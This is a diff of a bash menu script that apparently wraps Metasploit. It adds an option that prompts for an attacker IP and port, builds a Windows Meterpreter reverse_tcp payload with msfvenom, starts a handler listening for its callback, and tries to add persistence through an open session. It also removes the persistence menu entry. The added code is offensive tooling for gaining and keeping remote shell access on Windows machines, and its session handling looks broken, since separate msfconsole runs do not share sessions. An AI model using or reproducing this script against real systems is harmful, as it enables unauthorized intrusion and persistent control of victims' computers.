@@ -534,18 +534,33 @@ echo
    echo
    locals
     case $opt in
-        1)
-          echo "         ${FGC}     Forging a Windows Persistence Script :     ${NC}${YELLOW}"
-	  echo
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
-    	  read -p '	    Set Callback Interval* ' attinterval
-	  echo
-          echo 
-          echo -e "             ${GREEN}  ⌛⌛⌛ Your Persistence Script :     ${NC}${YELLOW}"                                                    
-    	  echo -e "                                                                          "  
-          echo -e " ${FGC} run persistence -U -X -i $attinterval -r $attackerip -p $attackerport ${NC}${YELLOW} " | fmt -s -w 80
-  	  echo 
+        1) # New function, pending testing
+  	 	  echo "Forging a Windows Persistence Script:"
+		  echo
+		  read -p 'Set Attacker IP: ' attackerip
+		  read -p 'Set Attacker Port: ' attackerport
+		  read -p 'Set Callback Interval: ' attinterval
+		  echo
+		  echo "Generating payload..."
+		  payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f exe -o /path/to/payload.exe)
+		  echo "Payload generated: $payload"
+		  echo
+		  echo "Starting Metasploit..."
+		  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $attackerip; set LPORT $attackerport; exploit -j" &
+		  sleep 5 # Give Metasploit some time to start
+
+		  # Check for an active session
+		  session=$(msfconsole -q -x "sessions -l" | grep "meterpreter" | awk '{print $1}')
+		  if [ -n "$session" ]; then
+			  echo "Session $session is active. Adding persistence..."
+			  msfconsole -q -x "use exploit/windows/local/persistence; set session $session; set LHOST $attackerip; set LPORT $attackerport; exploit" &
+			  sleep 5 # Give Metasploit some time to add persistence
+			  echo
+			  echo "Persistence added!"
+		  else
+			  echo "No active session found. Persistence cannot be added."
+		  fi
+
           pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
           goto stay;
 	;;
@@ -786,8 +801,8 @@ function pause(){
    echo "	  |---------------------------------------------|"
    echo "	  |    💉${GREEN} 3 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
+#   echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
+#   echo "	  |---------------------------------------------|"
    echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}Quit.                               ${YELLOW}|"
@@ -797,7 +812,7 @@ function pause(){
    echo ${NC}
    errors
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,M,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,M,q]    " opt
    case "$opt" in
        1) listeners
          ;;
